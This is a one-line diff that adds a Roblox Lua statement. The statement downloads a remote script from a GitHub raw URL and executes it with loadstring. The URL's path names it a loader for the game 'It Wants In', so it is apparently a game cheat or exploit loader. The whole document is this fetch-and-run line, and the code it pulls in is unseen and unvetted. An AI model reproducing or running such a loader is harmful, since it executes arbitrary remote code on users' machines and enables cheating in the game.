@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/it-wants-in-horror-spam4-2z7hb63djptoeg.lua"))()
